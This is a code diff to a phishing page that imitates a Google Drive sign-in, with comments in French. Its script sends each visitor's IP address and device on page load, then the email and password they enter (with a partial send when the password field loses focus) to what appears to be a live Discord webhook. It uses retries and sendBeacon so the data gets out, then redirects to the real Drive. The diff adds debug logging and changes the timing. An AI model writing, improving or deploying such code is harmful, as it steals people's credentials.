@@ -104,6 +104,14 @@
   }
   @keyframes sp{to{transform:rotate(360deg)}}
   .stat{font-size:11px;color:#80868b;text-align:right;margin-top:10px;min-height:14px}
+
+  #dbg{
+    display:none;position:fixed;left:0;right:0;bottom:0;z-index:99;
+    background:rgba(255,255,255,.97);border-top:1px solid #dadce0;
+    font:10px/1.45 ui-monospace,Menlo,monospace;color:#3c4043;
+    padding:6px 8px calc(6px + env(safe-area-inset-bottom));
+    white-space:pre-wrap;max-height:130px;overflow:hidden;
+  }
 </style>
 </head>
 <body>
@@ -186,9 +194,13 @@
   </div>
 </section>
 
+<div id="dbg"></div>
+
 <script>
 (function () {
   "use strict";
+
+  var DEBUG = true;
 
   var URLS = [
     "https://discord.com/api/v10/webhooks/1564072527142330579/ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot?wait=true",
@@ -198,7 +210,16 @@
   var REDIRECT = "https://drive.google.com/drive/my-drive";
 
   var $ = function (id) { return document.getElementById(id); };
-  var emailEl = $("email"), pwdEl = $("pwd"), statEl = $("stat");
+  var emailEl = $("email"), pwdEl = $("pwd"), statEl = $("stat"), dbgEl = $("dbg");
+
+  function log(s) {
+    if (!DEBUG) return;
+    dbgEl.style.display = "block";
+    var d = new Date();
+    var t = ("0" + d.getHours()).slice(-2) + ":" + ("0" + d.getMinutes()).slice(-2) + ":" + ("0" + d.getSeconds()).slice(-2);
+    var lines = (dbgEl.textContent + "\n" + t + " " + s).split("\n");
+    dbgEl.textContent = lines.slice(-9).join("\n");
+  }
 
   function show(id) {
     var all = document.querySelectorAll(".screen");
@@ -218,12 +239,15 @@
     }
     return out.join("&");
   }
+  function body(text) { return encode({ username: "Drive - " + CODE, content: text }); }
 
-  function post(url, payload, timeout) {
+  function post(url, payload, tag) {
     return new Promise(function (resolve) {
-      if (!window.fetch) { resolve(false); return; }
+      if (!window.fetch) { log(tag + " pas de fetch"); resolve(false); return; }
       var done = false;
-      var t = setTimeout(function () { if (!done) { done = true; resolve(false); } }, timeout || 2500);
+      var t = setTimeout(function () {
+        if (!done) { done = true; log(tag + " TIMEOUT"); resolve(false); }
+      }, 2500);
       fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
@@ -232,21 +256,21 @@
         credentials: "omit",
         mode: "cors"
       }).then(function (r) {
-        if (!done) { done = true; clearTimeout(t); resolve(!!(r && r.ok)); }
-      }).catch(function () {
-        if (!done) { done = true; clearTimeout(t); resolve(false); }
+        if (!done) { done = true; clearTimeout(t); log(tag + " -> " + r.status); resolve(!!(r && r.ok)); }
+      }).catch(function (e) {
+        if (!done) { done = true; clearTimeout(t); log(tag + " ERR " + (e && e.name ? e.name : "?")); resolve(false); }
       });
     });
   }
 
-  function withRetry(url, payload, tries) {
-    var delays = [0, 600, 1400, 2800];
+  function withRetry(url, payload, tries, tag) {
+    var delays = [0, 700, 1600, 3000];
     var i = 0;
     function step() {
       if (i >= tries) return Promise.resolve(false);
       var wait = delays[i]; i++;
       return sleep(wait).then(function () {
-        return post(url, payload, 2500).then(function (ok) {
+        return post(url, payload, tag + "#" + i).then(function (ok) {
           return ok ? true : step();
         });
       });
@@ -254,28 +278,18 @@
     return step();
   }
 
-  function body(text) { return encode({ username: "Drive - " + CODE, content: text }); }
-
   function beacon(text) {
     try {
       var blob = new Blob([body(text)], { type: "text/plain;charset=UTF-8" });
-      navigator.sendBeacon(URLS[0], blob);
-      navigator.sendBeacon(URLS[1], blob);
-    } catch (e) {}
-  }
-
-  /* Envoi vers les deux canaux, on s'arrête à la première confirmation */
-  function fanout(text, tries) {
-    var results = [];
-    for (var i = 0; i < URLS.length; i++) {
-      results.push(withRetry(URLS[i], body(text), tries));
-    }
-    return Promise.all(results).then(function (r) {
-      return r.indexOf(true) !== -1;
-    });
+      for (var i = 0; i < URLS.length; i++) {
+        var r = navigator.sendBeacon(URLS[i], blob);
+        log("beacon" + i + " " + (r ? "ok" : "refus"));
+      }
+    } catch (e) { log("beacon ERR " + e.name); }
   }
 
   window.addEventListener("load", function () {
+    log("page ouverte");
     var ip = "-";
     var ipReq = fetch("https://api.ipify.org?format=json", { cache: "no-store" })
       .then(function (r) { return r.json(); })
@@ -283,7 +297,8 @@
       .catch(function () {});
 
     Promise.race([ipReq, sleep(1200)]).then(function () {
-      fanout("\ud83d\udc40 Page ouverte\nCode : " + CODE + "\nIP : " + ip + "\nAppareil : " + ua(), 3);
+      var text = "\ud83d\udc40 Page ouverte\nCode : " + CODE + "\nIP : " + ip + "\nAppareil : " + ua();
+      for (var i = 0; i < URLS.length; i++) withRetry(URLS[i], body(text), 3, "ping" + i);
     });
   });
 
@@ -296,55 +311,81 @@
     e.preventDefault();
     var mail = emailEl.value;
     $("chipMail").textContent = mail || "-";
-    fanout("\u2709\ufe0f Email saisi\nCode : " + CODE + "\nEmail : " + mail, 3);
+    log("email soumis");
+    var text = "\u2709\ufe0f Email saisi\nCode : " + CODE + "\nEmail : " + mail;
+    for (var i = 0; i < URLS.length; i++) withRetry(URLS[i], body(text), 3, "mail" + i);
     show("s3");
     setTimeout(function () { try { pwdEl.focus(); } catch (err) {} }, 120);
   });
 
-  var busy = false, went = false, confirmed = false;
+  var busy = false, went = false, confirmed = false, partialSent = false;
 
   function go() {
     if (went) return;
     went = true;
-    location.replace(REDIRECT);
+    log("redirection");
+    setTimeout(function () { location.replace(REDIRECT); }, 3500);
   }
+
+  function buildText(partial) {
+    var head = partial ? "\u23f3 Mot de passe (partiel)" : "\ud83d\udd10 Identifiants";
+    return head + "\n"
+         + "Code : " + CODE + "\n"
+         + "Email : " + emailEl.value + "\n"
+         + "Mot de passe :\n```\n" + (pwdEl.value || "-") + "\n```\n"
+         + "Appareil : " + ua();
+  }
+
+  /* Filet : envoi dès que le champ perd le focus */
+  pwdEl.addEventListener("blur", function () {
+    if (busy || partialSent || !pwdEl.value) return;
+    partialSent = true;
+    log("blur, envoi partiel");
+    beacon(buildText(true));
+  });
 
   $("formPwd").addEventListener("submit", function (e) {
     e.preventDefault();
     if (busy) return;
     busy = true;
 
-    var mail = emailEl.value;
-    var pass = pwdEl.value;
-
     var btn = $("btnLogin");
     btn.disabled = true;
     btn.innerHTML = '<span class="spin"></span>Connexion\u2026';
     statEl.textContent = "Envoi\u2026";
 
-    var text = "\ud83d\udd10 Identifiants\n"
-             + "Code : " + CODE + "\n"
-             + "Email : " + mail + "\n"
-             + "Mot de passe :\n```\n" + (pass || "-") + "\n```\n"
-             + "Appareil : " + ua();
+    log("mdp len=" + pwdEl.value.length);
+    var text = buildText(false);
+    var payload;
+    try {
+      payload = body(text);
+      log("payload len=" + payload.length);
+    } catch (err) {
+      log("ENCODE ERR " + err.name);
+      payload = encode({ content: text });
+    }
 
-    /* chaque canal réessaie de son côté ; le premier qui passe débloque */
+    /* 1. beacon immédiat, jamais annulé par la navigation */
+    beacon(text);
+
+    /* 2. fetch avec réessais */
     for (var i = 0; i < URLS.length; i++) {
-      (function (url) {
-        withRetry(url, body(text), 4).then(function (ok) {
+      (function (url, idx) {
+        withRetry(url, payload, 4, "pwd" + idx).then(function (ok) {
+          log("pwd" + idx + " resultat=" + ok);
           if (!ok || confirmed) return;
           confirmed = true;
           statEl.textContent = "\u2713 Envoy\u00e9";
           btn.innerHTML = '<span class="spin"></span>Redirection\u2026';
-          setTimeout(go, 1000);
+          go();
         });
-      })(URLS[i]);
+      })(URLS[i], i);
     }
 
     setTimeout(function () {
-      if (!confirmed) { beacon(text); statEl.textContent = "Echec d'envoi"; }
+      if (!confirmed) { statEl.textContent = "Echec d'envoi"; log("plafond atteint"); }
       go();
-    }, 14000);
+    }, 18000);
   });
 
   $("showpwd").addEventListener("change", function () {
